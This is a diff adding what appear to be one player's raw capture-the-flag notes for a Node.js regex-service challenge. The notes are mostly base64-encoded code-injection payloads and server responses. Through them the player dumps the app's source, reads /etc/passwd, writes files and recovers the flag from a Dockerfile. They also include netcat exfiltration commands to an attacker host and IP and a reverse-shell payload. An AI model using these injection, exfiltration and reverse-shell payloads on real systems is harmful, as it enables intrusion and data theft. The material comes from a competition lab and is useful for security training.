@@ -1,0 +1,566 @@
+GET http://chal.cybersecurityrumble.de:9876/api/regex/ZmluZA==/Z2kg/QSByZWd1bGFyIGV4cHJlc3Npb24gKHNob3J0ZW5lZCBhcyByZWdleCBvciByZWdleHA7IGFsc28gcmVmZXJyZWQgdG8gYXMgcmF0aW9uYWwgZXhwcmVzc2lvbikgaXMgYSBzZXF1ZW5jZSBvZiBjaGFyYWN0ZXJzIHRoYXQgZGVmaW5lIGEgc2VhcmNoIHBhdHRlcm4uIFVzdWFsbHkgc3VjaCBwYXR0ZXJucyBhcmUgdXNlZCBieSBzdHJpbmctc2VhcmNoaW5nIGFsZ29yaXRobXMgZm9yICJmaW5kIiBvciAiZmluZCBhbmQgcmVwbGFjZSIgb3BlcmF0aW9ucyBvbiBzdHJpbmdzLCBvciBmb3IgaW5wdXQgdmFsaWRhdGlvbi4gSXQgaXMgYSB0ZWNobmlxdWUgZGV2ZWxvcGVkIGluIHRoZW9yZXRpY2FsIGNvbXB1dGVyIHNjaWVuY2UgYW5kIGZvcm1hbCBsYW5ndWFnZSB0aGVvcnkuCgpUaGUgY29uY2VwdCBhcm9zZSBpbiB0aGUgMTk1MHMgd2hlbiB0aGUgQW1lcmljYW4gbWF0aGVtYXRpY2lhbiBTdGVwaGVuIENvbGUgS2xlZW5lIGZvcm1hbGl6ZWQgdGhlIGRlc2NyaXB0aW9uIG9mIGEgcmVndWxhciBsYW5ndWFnZS4gVGhlIGNvbmNlcHQgY2FtZSBpbnRvIGNvbW1vbiB1c2Ugd2l0aCBVbml4IHRleHQtcHJvY2Vzc2luZyB1dGlsaXRpZXMuIERpZmZlcmVudCBzeW50YXhlcyBmb3Igd3JpdGluZyByZWd1bGFyIGV4cHJlc3Npb25zIGhhdmUgZXhpc3RlZCBzaW5jZSB0aGUgMTk4MHMsIG9uZSBiZWluZyB0aGUgUE9TSVggc3RhbmRhcmQgYW5kIGFub3RoZXIsIHdpZGVseSB1c2VkLCBiZWluZyB0aGUgUGVybCBzeW50YXguCgpSZWd1bGFyIGV4cHJlc3Npb25zIGFyZSB1c2VkIGluIHNlYXJjaCBlbmdpbmVzLCBzZWFyY2ggYW5kIHJlcGxhY2UgZGlhbG9ncyBvZiB3b3JkIHByb2Nlc3NvcnMgYW5kIHRleHQgZWRpdG9ycywgaW4gdGV4dCBwcm9jZXNzaW5nIHV0aWxpdGllcyBzdWNoIGFzIHNlZCBhbmQgQVdLIGFuZCBpbiBsZXhpY2FsIGFuYWx5c2lzLiBNYW55IHByb2dyYW1taW5nIGxhbmd1YWdlcyBwcm92aWRlIHJlZ2V4IGNhcGFiaWxpdGllcyBlaXRoZXIgYnVpbHQtaW4gb3IgdmlhIGxpYnJhcmllcy4KCmh0dHBzOi8vZW4ud2lraXBlZGlhLm9yZy93aWtpL1JlZ3VsYXJfZXhwcmVzc2lvbg==
+
+GET http://chal.cybersecurityrumble.de:9876/api/regex/<pattern>/gi/<input>
+GET http://chal.cybersecurityrumble.de:9876/api/regex/bHMK/Z2kg/ZnVja2luZyBsc2Vycwo=
+
+http://chal.cybersecurityrumble.de:9876/api/regex/bHM=/Z2kg/QSByZWd1bGFyIGV4cHJlc3Npb24gKHNob3J0ZW5lZCBhcyByZWdleCBvciByZWdleHA7IGFsc28gcmVmZXJyZWQgdG8gYXMgcmF0aW9uYWwgZXhwcmVzc2lvbikgaXMgYSBzZXF1ZW5jZSBvZiBjaGFyYWN0ZXJzIHRoYXQgZGVmaW5lIGEgc2VhcmNoIHBhdHRlcm4uIFVzdWFsbHkgc3VjaCBwYXR0ZXJucyBhcmUgdXNlZCBieSBzdHJpbmctc2VhcmNoaW5nIGFsZ29yaXRobXMgZm9yICJmaW5kIiBvciAiZmluZCBhbmQgcmVwbGFjZSIgb3BlcmF0aW9ucyBvbiBzdHJpbmdzLCBvciBmb3IgaW5wdXQgdmFsaWRhdGlvbi4gSXQgaXMgYSB0ZWNobmlxdWUgZGV2ZWxvcGVkIGluIHRoZW9yZXRpY2FsIGNvbXB1dGVyIHNjaWVuY2UgYW5kIGZvcm1hbCBsYW5ndWFnZSB0aGVvcnkuCgpUaGUgY29uY2VwdCBhcm9zZSBpbiB0aGUgMTk1MHMgd2hlbiB0aGUgQW1lcmljYW4gbWF0aGVtYXRpY2lhbiBTdGVwaGVuIENvbGUgS2xlZW5lIGZvcm1hbGl6ZWQgdGhlIGRlc2NyaXB0aW9uIG9mIGEgcmVndWxhciBsYW5ndWFnZS4gVGhlIGNvbmNlcHQgY2FtZSBpbnRvIGNvbW1vbiB1c2Ugd2l0aCBVbml4IHRleHQtcHJvY2Vzc2luZyB1dGlsaXRpZXMuIERpZmZlcmVudCBzeW50YXhlcyBmb3Igd3JpdGluZyByZWd1bGFyIGV4cHJlc3Npb25zIGhhdmUgZXhpc3RlZCBzaW5jZSB0aGUgMTk4MHMsIG9uZSBiZWluZyB0aGUgUE9TSVggc3RhbmRhcmQgYW5kIGFub3RoZXIsIHdpZGVseSB1c2VkLCBiZWluZyB0aGUgUGVybCBzeW50YXguCgpSZWd1bGFyIGV4cHJlc3Npb25zIGFyZSB1c2VkIGluIHNlYXJjaCBlbmdpbmVzLCBzZWFyY2ggYW5kIHJlcGxhY2UgZGlhbG9ncyBvZiB3b3JkIHByb2Nlc3NvcnMgYW5kIHRleHQgZWRpdG9ycywgaW4gdGV4dCBwcm9jZXNzaW5nIHV0aWxpdGllcyBzdWNoIGFzIHNlZCBhbmQgQVdLIGFuZCBpbiBsZXhpY2FsIGFuYWx5c2lzLiBNYW55IHByb2dyYW1taW5nIGxhbmd1YWdlcyBwcm92aWRlIHJlZ2V4IGNhcGFiaWxpdGllcyBlaXRoZXIgYnVpbHQtaW4gb3IgdmlhIGxpYnJhcmllcy4KCmh0dHBzOi8vZW4ud2lraXBlZGlhLm9yZy93aWtpL1JlZ3VsYXJfZXhwcmVzc2lvbg==
+
+
+'this'.match(/is/gi);require('fs').readdirSync('.').toString()
+------------------------------------------------------------#-
+
+is -> aXM=
+gi);require('fs').readdirSync('.').toString( -> Z2kpO3JlcXVpcmUoJ2ZzJykucmVhZGRpclN5bmMoJy4nKS50b1N0cmluZyg=
+this -> dGhpcw==
+
+http://chal.cybersecurityrumble.de:9876/api/regex/aXM=/Z2kpO3JlcXVpcmUoJ2ZzJykucmVhZGRpclN5bmMoJy4nKS50b1N0cmluZyg=/dGhpcw==
+
+---
+
+eval("'this'.match(/is/gi);require('fs').readdirSync('.').toString()");
+eval("'this'.match(/is/gi);res.end(require('fs').readdirSync('.').toString())");
+
+is -> aXM=
+gi);fs.readdirSync('.').toString( -> Z2kpO2ZzLnJlYWRkaXJTeW5jKCcuJykudG9TdHJpbmco
+gi);res.end(require('fs').readdirSync('.').toString() -> Z2kpO3Jlcy5lbmQocmVxdWlyZSgnZnMnKS5yZWFkZGlyU3luYygnLicpLnRvU3RyaW5nKCk=
+this -> dGhpcw==
+
+http://chal.cybersecurityrumble.de:9876/api/regex/aXM=/Z2kpO2ZzLnJlYWRkaXJTeW5jKCcuJykudG9TdHJpbmco/dGhpcw==
+http://chal.cybersecurityrumble.de:9876/api/regex/aXM=/Z2kpO3Jlcy5lbmQocmVxdWlyZSgnZnMnKS5yZWFkZGlyU3luYygnLicpLnRvU3RyaW5nKCk=/dGhpcw==
+
+Server unresponsive
+
+---
+
+eval("'this'.match(/is/gi);");
+
+is -> aXM=
+gi);('hello' -> Z2kpOygnaGVsbG8n
+this -> dGhpcw==
+
+http://chal.cybersecurityrumble.de:9876/api/regex/aXM=/Z2kpOygnaGVsbG8n/dGhpcw==
+
+---
+
+eval("'this'.match(/is/gi);process.cwd()");
+
+is -> aXM=
+gi);process.cwd( -> Z2kpO3Byb2Nlc3MuY3dkKA==
+this -> dGhpcw==
+
+http://chal.cybersecurityrumble.de:9876/api/regex/aXM=/Z2kpO3Byb2Nlc3MuY3dkKA==/dGhpcw==
+
+---
+
+eval("'xxx'+process.cwd()+'xxx'.match(/.*/gi)");
+input: xxx'+process.cwd()+'xxx
+
+eval("''+process.cwd()+''.match(/.*/gi)");
+eval("''+require('fs').readdirSync('.').toString()+''.match(/.*/gi)");
+
+child_process.exec('ls')
+
+'+res.end(require('fs').readdirSync('.').toString())+'
+'+require('child_process').exec('cat+/etc/passwd+|+nc+attackerip+80')+'
+
+process.cwd()
+console.log('hello')
+
+' + process.cwd() + '
+
+'+process.cwd()+eval("'fuck'")+'hi
+
+require is not defined
+
+eval("Object.getOwnPropertyNames(process.env)")
+eval("Object.getOwnPropertyNames(this)")
+
+{ "result": "/app PATH,HOSTNAME,NPM_VERSION,YARN_VERSION,HOME hi," }
+HOSTNAME = 33dc98878ad1
+NPM_VERSION = 6.14.8
+YARN_VERSION = 1.22.10
+HOME = /home/server
+
+'+Object.getOwnPropertyNames(this)+'
+{ "result": "simpleFs" }
+
+'+Object.getOwnPropertyNames(this.simpleFs)+'
+{ "result": "length,prototype,exists,readFile,readFileSync,writeFile,writeFileSync,appendFile,appendFileSync,name" }
+
+'+this.simpleFs+'
+{ "result": "class SimpleFs {\n static exists(path) {\n return new Promise((res, rej) => {\n fs.stat(path, (err, stats) => {\n if (err) return rej(err);\n if (!stats.isFile()) return rej('Not a file');\n return res();\n });\n });\n }\n\n static readFile(path) {\n return new Promise((res, rej) => {\n if (!fs.existsSync(path)) return rej('File not found');\n fs.readFile(path, { encoding: 'utf-8' }, (err, data) => {\n if (err) return rej(err);\n return res(data);\n });\n });\n }\n\n static readFileSync(path) {\n if (!fs.existsSync(path)) return rej('File not found');\n try {\n return fs.readFileSync(path, { encoding: 'utf-8' });\n } catch (ex) {\n return false;\n }\n }\n\n static writeFile(path, contents) {\n return new Promise((res, rej) => {\n if (fs.existsSync(path)) return rej('File already exists');\n fs.writeFile(path, contents, { encoding: 'utf-8' }, (err) => {\n if (err) return rej(err);\n return res();\n })\n });\n }\n\n static writeFileSync(path, contents) {\n if (fs.existsSync(path)) return rej('File already exists');\n try {\n fs.writeFileSync(path, contents, { encoding: 'utf-8' });\n return true;\n } catch (ex) {\n return false;\n }\n }\n\n static appendFile(path, contents) {\n return new Promise((res, rej) => {\n if (!fs.existsSync(path)) return rej('File not found');\n fs.appendFile(path, contents, { encoding: 'utf-8' }, (err) => {\n if (err) return rej(err);\n return res();\n });\n });\n }\n\n static appendFileSync(path, contents) {\n if (!fs.existsSync(path)) return rej('File not found');\n try {\n fs.appendFileSync(path, contents, { encoding: 'utf-8' });\n return true;\n } catch (ex) {\n return false;\n }\n }\n}" }
+
+class SimpleFs {
+    static exists(path) {
+        return new Promise((res, rej) => {
+            fs.stat(path, (err, stats) => {
+                if (err) return rej(err);
+                if (!stats.isFile()) return rej('Not a file');
+                return res();
+            });
+        });
+    }
+
+    static readFile(path) {
+        return new Promise((res, rej) => {
+            if (!fs.existsSync(path)) return rej('File not found');
+            fs.readFile(path, {
+                encoding: 'utf-8'
+            }, (err, data) => {
+                if (err) return rej(err);
+                return res(data);
+            });
+        });
+    }
+
+    static readFileSync(path) {
+        if (!fs.existsSync(path)) return rej('File not found');
+        try {
+            return fs.readFileSync(path, {
+                encoding: 'utf-8'
+            });
+        } catch (ex) {
+            return false;
+        }
+    }
+
+    static writeFile(path, contents) {
+        return new Promise((res, rej) => {
+            if (fs.existsSync(path)) return rej('File already exists');
+            fs.writeFile(path, contents, {
+                encoding: 'utf-8'
+            }, (err) => {
+                if (err) return rej(err);
+                return res();
+            })
+        });
+    }
+
+    static writeFileSync(path, contents) {
+        if (fs.existsSync(path)) return rej('File already exists');
+        try {
+            fs.writeFileSync(path, contents, {
+                encoding: 'utf-8'
+            });
+            return true;
+        } catch (ex) {
+            return false;
+        }
+    }
+
+    static appendFile(path, contents) {
+        return new Promise((res, rej) => {
+            if (!fs.existsSync(path)) return rej('File not found');
+            fs.appendFile(path, contents, {
+                encoding: 'utf-8'
+            }, (err) => {
+                if (err) return rej(err);
+                return res();
+            });
+        });
+    }
+
+    static appendFileSync(path, contents) {
+        if (!fs.existsSync(path)) return rej('File not found');
+        try {
+            fs.appendFileSync(path, contents, {
+                encoding: 'utf-8'
+            });
+            return true;
+        } catch (ex) {
+            return false;
+        }
+    }
+}
+
+'+process.argv+'
+{ "result": "/usr/bin/node,/app/index.js" }
+
+'+this.simpleFs.readFileSync('/app/index.js')+'
+
+{ "result": "var express = require('express');\nvar cors = require('cors');\n\nvar app = express();\nvar api = require('./api')\n\napp.use(cors());\n\nprocess.on('unhandledRejection', (reason, promise) => {\n console.log('Unhandled Rejection at:', reason.stack || reason)\n})\n\n\nprocess.on('uncaughtException', function (err) {\n console.error(err.stack);\n});\n\napp.use((req, res, next) => {\n res.header('Server', 'dunno');\n res.header('X-Powered-By', 'love <3');\n res.header('Level', (9000 + Math.random() * 1000).toFixed(0));\n next();\n});\n\n//Static\napp.use(express.static('dist'));\n\n//rest\napp.use('/api', api);\n\n//Troll\napp.use('/admin', function (req, res) {\n res.status(401).send();\n});\napp.use('/phpMyAdmin', function (req, res) {\n res.status(402).send();\n});\napp.use('/test.php', function (req, res) {\n res.status(403).send();\n});\n\n//Custom 404\napp.get('*', function (req, res) {\n res.status(404).send('notfound.jpeg');\n});\n\napp.listen(8080, () => {\n console.log(`Listening...`)\n});" }
+
+var express = require('express');
+var cors = require('cors');
+
+var app = express();
+var api = require('./api')
+
+app.use(cors());
+
+process.on('unhandledRejection', (reason, promise) => {
+ console.log('Unhandled Rejection at:', reason.stack || reason)
+})
+
+
+process.on('uncaughtException', function (err) {
+ console.error(err.stack);
+});
+
+app.use((req, res, next) => {
+ res.header('Server', 'dunno');
+ res.header('X-Powered-By', 'love <3');
+ res.header('Level', (9000 + Math.random() * 1000).toFixed(0));
+ next();
+});
+
+//Static
+app.use(express.static('dist'));
+
+//rest
+app.use('/api', api);
+
+//Troll
+app.use('/admin', function (req, res) {
+ res.status(401).send();
+});
+app.use('/phpMyAdmin', function (req, res) {
+ res.status(402).send();
+});
+app.use('/test.php', function (req, res) {
+ res.status(403).send();
+});
+
+//Custom 404
+app.get('*', function (req, res) {
+ res.status(404).send('notfound.jpeg');
+});
+
+app.listen(8080, () => {
+ console.log(`Listening...`)
+});
+
+{ "result": "var express = require('express');\nvar router = express.Router();\nvar RegexEr = require('./regexer')\n\nrouter.get('/regex/:pattern/:flags/:input', (req, res) => {\n var params = {\n pattern: req.params.pattern,\n input: req.params.input,\n flags: req.params.flags\n };\n try {\n params.pattern = Buffer.from(req.params.pattern, 'base64').toString();\n params.input = Buffer.from(req.params.input, 'base64').toString().replace(/\\n/gm, \"\").trim();\n params.flags = Buffer.from(req.params.flags, 'base64').toString();\n RegexEr.process(params.pattern, params.flags, params.input)\n .then((result) => res.status(200).send({result: result}))\n .catch((err) => res.status(400).send({ error: err.message }));\n\n } catch (ex) {\n console.error(ex);\n res.status(400).send(JSON.stringify(ex));\n }\n\n});\n\nmodule.exports = router;" }
+
+var express = require('express');
+var router = express.Router();
+var RegexEr = require('./regexer')
+
+router.get('/regex/:pattern/:flags/:input', (req, res) => {
+    var params = {
+        pattern: req.params.pattern,
+        input: req.params.input,
+        flags: req.params.flags
+    };
+    try {
+        params.pattern = Buffer.from(req.params.pattern, 'base64').toString();
+        params.input = Buffer.from(req.params.input, 'base64').toString().replace(/\ / gm, \"\").trim();
+        params.flags = Buffer.from(req.params.flags, 'base64').toString(); RegexEr.process(params.pattern, params.flags, params.input)
+        .then((result) => res.status(200).send({
+            result: result
+        }))
+        .catch((err) => res.status(400).send({
+            error: err.message
+        }));
+    }
+    catch (ex) {
+        console.error(ex);
+        res.status(400).send(JSON.stringify(ex));
+    }
+});
+
+module.exports = router;
+
+'+this.simpleFs.readFileSync('/app/regexer.js')+'
+{ "result": "const sfs = require('./simple-fs');\n\nconst LOGFILE = 'requests.log';\n\nclass RegexEr {\n constructor() {\n this.simpleFs = sfs;\n }\n process(pattern, flags, input) {\n return new Promise((res, rej) => {\n try {\n var str = `var _result = '${input}'.match(/${pattern}/${flags}); return _result;`;\n this.addLogLine(LOGFILE, str + '\\n');\n console.log(str);\n var fun = new Function(str);\n var result = fun.call(this);\n res(result);\n } catch (ex) {\n rej(ex);\n }\n });\n }\n addLogLine(logFile, content) {\n this.simpleFs.appendFile(logFile, content);\n }\n}\n\nconst REGEXER_INSTANCE = new RegexEr();\n\nmodule.exports = REGEXER_INSTANCE;" }
+
+const sfs = require('./simple-fs');
+
+const LOGFILE = 'requests.log';
+
+class RegexEr {
+    constructor() {
+        this.simpleFs = sfs;
+    }
+    process(pattern, flags, input) {
+        return new Promise((res, rej) => {
+            try {
+                var str = `var _result = '${input}'.match(/${pattern}/${flags}); return _result;`;
+                this.addLogLine(LOGFILE, str + '\n');
+                console.log(str);
+                var fun = new Function(str);
+                var result = fun.call(this);
+                res(result);
+            } catch (ex) {
+                rej(ex);
+            }
+        });
+    }
+    addLogLine(logFile, content) {
+        this.simpleFs.appendFile(logFile, content);
+    }
+}
+
+const REGEXER_INSTANCE = new RegexEr();
+module.exports = REGEXER_INSTANCE;
+
+'+this.simpleFs.readFileSync('/app/simple-fs.js')+'
+const fs = require('fs');
+const LEGACY_UTILS = require('./leftover')
+
+class SimpleFs {
+ static exists(path) {
+ return new Promise((res, rej) => {
+ fs.stat(path, (err, stats) => {
+ if (err) return rej(err);
+ if (!stats.isFile()) return rej('Not a file');
+ return res();
+ });
+ });
+ }
+
+ static readFile(path) {
+ return new Promise((res, rej) => {
+ if (!fs.existsSync(path)) return rej('File not found');
+ fs.readFile(path, { encoding: 'utf-8' }, (err, data) => {
+ if (err) return rej(err);
+ return res(data);
+ });
+ });
+ }
+
+ static readFileSync(path) {
+ if (!fs.existsSync(path)) return rej('File not found');
+ try {
+ return fs.readFileSync(path, { encoding: 'utf-8' });
+ } catch (ex) {
+ return false;
+ }
+ }
+
+ static writeFile(path, contents) {
+ return new Promise((res, rej) => {
+ if (fs.existsSync(path)) return rej('File already exists');
+ fs.writeFile(path, contents, { encoding: 'utf-8' }, (err) => {
+ if (err) return rej(err);
+ return res();
+ })
+ });
+ }
+
+ static writeFileSync(path, contents) {
+ if (fs.existsSync(path)) return rej('File already exists');
+ try {
+ fs.writeFileSync(path, contents, { encoding: 'utf-8' });
+ return true;
+ } catch (ex) {
+ return false;
+ }
+ }
+
+ static appendFile(path, contents) {
+ return new Promise((res, rej) => {
+ if (!fs.existsSync(path)) return rej('File not found');
+ fs.appendFile(path, contents, { encoding: 'utf-8' }, (err) => {
+ if (err) return rej(err);
+ return res();
+ });
+ });
+ }
+
+ static appendFileSync(path, contents) {
+ if (!fs.existsSync(path)) return rej('File not found');
+ try {
+ fs.appendFileSync(path, contents, { encoding: 'utf-8' });
+ return true;
+ } catch (ex) {
+ return false;
+ }
+ }
+}
+
+module.exports = SimpleFs;
+
+'+this.simpleFs.readFileSync('/app/leftover.js')+'
+{ "result": "class Utility {\n require(resource) {\n return new Promise((res, rej)=>{\n try {\n var module = require(resource);\n return res(module); \n } catch(ex) {\n return rej(ex);\n }\n });\n }\n isRunningOnWindows() {\n return process.platform.indexOf('win' === 0);\n }\n getUrlHost(url) {\n try{\n return new URL(url).hostname;\n } catch(ex){\n return null;\n }\n }\n}\n\nLEGACY_UTILS = new Utility();\n\nmodule.exports = LEGACY_UTILS;" }
+
+class Utility {
+ require(resource) {
+ return new Promise((res, rej)=>{
+ try {
+ var module = require(resource);
+ return res(module); 
+ } catch(ex) {
+ return rej(ex);
+ }
+ });
+ }
+ isRunningOnWindows() {
+ return process.platform.indexOf('win' === 0);
+ }
+ getUrlHost(url) {
+ try{
+ return new URL(url).hostname;
+ } catch(ex){
+ return null;
+ }
+ }
+}
+
+LEGACY_UTILS = new Utility();
+
+module.exports = LEGACY_UTILS;
+
+'+LEGACY_UTILS.isRunningOnWindows()+'
+'+LEGACY_UTILS.getUrlHost('https://example.org:81/foo')+'
+'+LEGACY_UTILS.require('https://example.org:81/foo')+'
+'+LEGACY_UTILS.require("fs").readdirSync('.').toString()+'
+'+LEGACY_UTILS.require('fs').then(function(fs) { console.log(fs.readdirSync('.').toString()); }, null);+'
+
+'+this.simpleFs.readFileSync('/app/requests.log')+'
+
+x = LEGACY_UTILS.require('fs')
+y = x.then(function(fs) { return fs.readdirSync('.').toString(); }, function(fs) { console.log('error'); });
+x.then(function(fs) { fs.writeFileSync("/tmp/idiot", fs.readdirSync('.').toString()); }, null);
+x.then(function(fs) { fs.writeFileSync("/app/idiot", fs.readdirSync('.').toString()); }, null);
+x.then(function(fs) { z = fs.readdirSync('.').toString(); }, null);
+LEGACY_UTILS.require('fs').then(function(fs) { console.log(fs.readdirSync('.').toString()); }, null);
+
+'+LEGACY_UTILS.require('fs').then(function(fs) { fs.writeFileSync('/app/requests.log', fs.readdirSync('.').toString()); }, function(err) { return err; })+'
+'+this.simpleFs.readFileSync('/app/requests.log')+'
+'+this.simpleFs.appendFileSync('/app/requests.log', 'dumb')+'
+'+this.simpleFs.readFileSync('/app/requests.log')+'
+
+async function stupid() { let fs = await LEGACY_UTILS.require('fs'); return fs; }
+stupid()
+
+---
+
+var str = `var _result = '${input}'.match(/${pattern}/${flags}); return _result;`;
+var _result = '${input}'.match(/${pattern}/${flags}); return _result;
+var _result = 'this'.match(/is/gi); LEGACY_UTILS.require('fs').then(function(fs) { _result = fs.readdirSync('.').toString(); }, null); return _result;
+var _result = 'this'.match(/is/gi); (_result = 'fuck'); return _result;
+
+is -> aXM=
+gi); LEGACY_UTILS.require('fs').then(function(fs) { _result = fs.readdirSync('.').toString(); }, null -> Z2kpOyBMRUdBQ1lfVVRJTFMucmVxdWlyZSgnZnMnKS50aGVuKGZ1bmN0aW9uKGZzKSB7IF9yZXN1bHQgPSBmcy5yZWFkZGlyU3luYygnLicpLnRvU3RyaW5nKCk7IH0sIG51bGw=
+gi); (_result = 'fuck' -> Z2kpOyAoX3Jlc3VsdCA9ICdmdWNrJw==
+this -> dGhpcw==
+
+http://chal.cybersecurityrumble.de:9876/api/regex/aXM=/Z2kpOyBMRUdBQ1lfVVRJTFMucmVxdWlyZSgnZnMnKS50aGVuKGZ1bmN0aW9uKGZzKSB7IF9yZXN1bHQgPSBmcy5yZWFkZGlyU3luYygnLicpLnRvU3RyaW5nKCk7IH0sIG51bGw=/dGhpcw==
+
+## Works!!
+http://chal.cybersecurityrumble.de:9876/api/regex/aXM=/Z2kpOyAoX3Jlc3VsdCA9ICdmdWNrJw==/dGhpcw==
+
+'+this.simpleFs.readFileSync('/etc/passwd')+'
+{ "result": "root:x:0:0:root:/root:/bin/ash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/spool/mail:/sbin/nologin\nnews:x:9:13:news:/usr/lib/news:/sbin/nologin\nuucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin\noperator:x:11:0:operator:/root:/bin/sh\nman:x:13:15:man:/usr/man:/sbin/nologin\npostmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin\ncron:x:16:16:cron:/var/spool/cron:/sbin/nologin\nftp:x:21:21::/var/lib/ftp:/sbin/nologin\nsshd:x:22:22:sshd:/dev/null:/sbin/nologin\nat:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin\nsquid:x:31:31:Squid:/var/cache/squid:/sbin/nologin\nxfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin\ngames:x:35:35:games:/usr/games:/sbin/nologin\npostgres:x:70:70::/var/lib/postgresql:/bin/sh\ncyrus:x:85:12::/usr/cyrus:/sbin/nologin\nvpopmail:x:89:89::/var/vpopmail:/sbin/nologin\nntp:x:123:123:NTP:/var/empty:/sbin/nologin\nsmmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin\nguest:x:405:100:guest:/dev/null:/sbin/nologin\nnobody:x:65534:65534:nobody:/:/sbin/nologin\nserver:x:1000:1000::/home/server:/bin/ash\n" }
+
+root:x:0:0:root:/root:/bin/ash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+news:x:9:13:news:/usr/lib/news:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+operator:x:11:0:operator:/root:/bin/sh
+man:x:13:15:man:/usr/man:/sbin/nologin
+postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
+cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
+ftp:x:21:21::/var/lib/ftp:/sbin/nologin
+sshd:x:22:22:sshd:/dev/null:/sbin/nologin
+at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
+squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
+xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
+games:x:35:35:games:/usr/games:/sbin/nologin
+postgres:x:70:70::/var/lib/postgresql:/bin/sh
+cyrus:x:85:12::/usr/cyrus:/sbin/nologin
+vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
+ntp:x:123:123:NTP:/var/empty:/sbin/nologin
+smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
+guest:x:405:100:guest:/dev/null:/sbin/nologin
+nobody:x:65534:65534:nobody:/:/sbin/nologin
+server:x:1000:1000::/home/server:/bin/ash
+
+---
+
+let input = "this";
+let pattern = "is";
+let flags = "gi); LEGACY_UTILS.require('fs').then((fs) => { _result = fs.readdirSync('.').toString(); }, null";
+
+var str = `var _result = '${input}'.match(/${pattern}/${flags}); return _result;`;
+console.log(str);
+var fun = new Function(str);
+var result = fun.call(this);
+
+var _result = 'this'.match(/is/gi); LEGACY_UTILS.require('fs').then((fs) => { _result = fs.readdirSync('.').toString(); }, null); return _result;
+
+---
+
+var _result = 'this'.match(/is/gi);
+
+(async function() {
+    var fs = await LEGACY_UTILS.require('fs');
+    _result = fs.readdirSync('.').toString();
+})();
+
+return _result;
+
+---
+
+var _result = 'this'.match(/is/gi); (async function() { var fs = await LEGACY_UTILS.require('fs'); _result = fs.readdirSync('.').toString(); })(); return _result;
+
+let input = "this";
+let pattern = "is";
+let flags = "gi); (async function() { var fs = await LEGACY_UTILS.require('fs'); _result = fs.readdirSync('.').toString(); })(";
+
+var str = `var _result = '${input}'.match(/${pattern}/${flags}); return _result;`;
+console.log(str);
+var fun = new Function(str);
+var result = fun.call(this);
+
+' + LEGACY_UTILS.require('child_process').then((cp) => { cp.exec ('ls | nc 50.4.224.86 4445') }, null) + '
+ nc -lvp 4445
+Listening on [0.0.0.0] (family 0, port 4445)
+Connection from 193.10.78.34.bc.googleusercontent.com 44997 received!
+api.js
+csregex
+dist
+dockerfile
+index.js
+leftover.js
+node_modules
+package-lock.json
+package.json
+regexer.js
+requests.log
+simple-fs.js
+
+
+"from mhart/alpine-node:12
+WORKDIR /app
+COPY . .
+RUN apk update
+RUN apk upgrade
+RUN apk add bash
+RUN apk add curl
+RUN npm install
+RUN chown root:root .
+RUN chmod -R 755 .
+RUN adduser -D -g '' server
+RUN touch requests.log
+RUN chown server:server requests.log
+RUN chmod +s /usr/bin/curl
+RUN echo 'CSR{r363x_15_fun_r363x_15_l0v3}' > /root/flaggerino_flaggeroni.toxt
+RUN chmod 640 /root/flaggerino_flaggeroni.toxt
+RUN chmod 744 /root
+USER server
+EXPOSE 8080
+CMD [ \"node\", \"index.js\"]"
+
+## Doesn't work
+' + LEGACY_UTILS.require('child_process').then(
+    (cp) => {
+        sh = cp.spawn("/bin/sh", []);
+        var client = new net.Socket();
+        client.connect(4445, "50.4.224.86", () => {
+            client.pipe(sh.stdin);
+            sh.stdout.pipe(client);
+            sh.stderr.pipe(client);
+        });
+        return /a/;
+    },
+    null
+) + '
